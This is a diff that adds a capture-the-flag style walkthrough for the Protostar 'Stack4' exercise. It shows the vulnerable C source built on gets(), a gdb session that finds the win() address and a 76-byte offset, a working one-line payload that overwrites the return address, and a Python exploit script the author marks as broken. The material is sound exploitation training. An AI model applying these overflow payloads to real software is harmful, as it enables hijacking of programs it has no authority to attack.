@@ -242,3 +242,119 @@ cproc = Popen("./stack3", stdin=PIPE, stdout=PIPE)
 print cproc.communicate(input)[0]
 ```
 
+
+
+
+
+
+#Stack4
+---------------------------------------
+###Source Code:
+```C
+#include <stdlib.h>
+#include <unistd.h>
+#include <stdio.h>
+#include <string.h>
+
+void win()
+{
+  printf("code flow successfully changed\n");
+}
+
+int main(int argc, char **argv)
+{
+  char buffer[64];
+
+  gets(buffer);
+}
+```
+###Stack:
+| eip | ebp |   buffer  |
+
+###Plan:
+Another overflow. This time we need to use objdump/gdb to find the memory location of the win function, then we want to overwrite EIP so that we return to win.
+First we find where we need to jump with gdb.
+```
+$ gdb ./stack4
+GNU gdb (Ubuntu 7.7.1-0ubuntu5~14.04.2) 7.7.1
+Reading symbols from ./stack4...done.
+(gdb) x win
+0x80483f4 <win>:        0x83e58955
+```
+By looking at the source code, you might assume that we simply need to fill buffer(64bytes), which will then overflow into EBP(4bytes) and then the next bytes of our input would overwrite EIP. We could try something like this
+```bash
+python -c "print (68*'a')+'\xf4\x83\x04\x08'" | ./stack4
+```
+This does not work, and it's because (as the hint says) compilers behavior isnt always apparent.
+So lets fire up GDB
+```bash
+$ gdb ./stack4
+Reading symbols from ./stack4...done.
+(gdb) disas main   
+Dump of assembler code for function main:
+   0x08048408 <+0>:     push   %ebp
+   0x08048409 <+1>:     mov    %esp,%ebp
+   0x0804840b <+3>:     and    $0xfffffff0,%esp
+   0x0804840e <+6>:     sub    $0x50,%esp
+   0x08048411 <+9>:     lea    0x10(%esp),%eax
+   0x08048415 <+13>:    mov    %eax,(%esp)
+   0x08048418 <+16>:    call   0x804830c <gets@plt>
+   0x0804841d <+21>:    leave  
+   0x0804841e <+22>:    ret    
+End of assembler dump.
+(gdb) b *0x0804841d
+Breakpoint 1 at 0x804841d: file stack4/stack4.c, line 16.
+(gdb) run
+Starting program: /home/ubuntu/workspace/proto/stack4 
+aaaaaaaaaaaaaaaaaaaaaaaaaaa
+
+Breakpoint 1, main (argc=1, argv=0xffffd1c4) at stack4/stack4.c:16
+16      stack4/stack4.c: No such file or directory.
+(gdb) x/40wx $esp
+0xffffd0d0:     0xffffd0e0      0xffffd0fe      0xf7e25bf8      0xf7e4c273
+0xffffd0e0:     0x61616161      0x61616161      0x61616161      0x61616161
+0xffffd0f0:     0x61616161      0x61616161      0x00616161      0x08048449
+0xffffd100:     0x08048430      0x08048340      0x00000000      0xf7e4c42d
+0xffffd110:     0xf7fc33c4      0xf7ffd000      0x0804843b      0xf7fc3000
+0xffffd120:     0x08048430      0x00000000      0x00000000      0xf7e32a83
+0xffffd130:     0x00000001      0xffffd1c4      0xffffd1cc      0xf7feacea
+0xffffd140:     0x00000001      0xffffd1c4      0xffffd164      0x08049600
+0xffffd150:     0x08048218      0xf7fc3000      0x00000000      0x00000000
+0xffffd160:     0x00000000      0xebc5d5ee      0xd23331fe      0x00000000
+(gdb) p $ebp
+$1 = (void *) 0xffffd128
+(gdb) p 0xffffd12c - 0xffffd0e0                                                                                                                                                                   
+$2 = 76
+(gdb) 
+```
+Now we know the offset is actually 76 so we can craft an input and test
+```bash
+$ python -c "print 'a'*76+'aaaa'" | ./stack4                                                                                                            
+Segmentation fault
+```
+
+Good sign! Now we replace 'aaaa' with our target location(win) which was at 080483f4.
+```bash
+$ python -c "print 'a'*76+'\xf4\x83\x04\x08'" | ./stack4
+code flow successfully changed
+Segmentation fault
+```
+We could probably get rid of the segfault but we wont worry about that now
+
+###winning command:
+```bash
+python -c "print 'a'*76+'\xf4\x83\x04\x08'" | ./stack4
+```
+###Python exploit:  (BROKEN, need to figure out why popen isnt working)
+```Python
+from subprocess import Popen, PIPE
+import os
+################
+input=(0x4c*'a')+'\xf4\x83\x04\x08'
+
+print(input)
+#################
+
+cproc = Popen(["./stack4"], stdin=PIPE, stdout=PIPE)
+print cproc.communicate(input)
+```
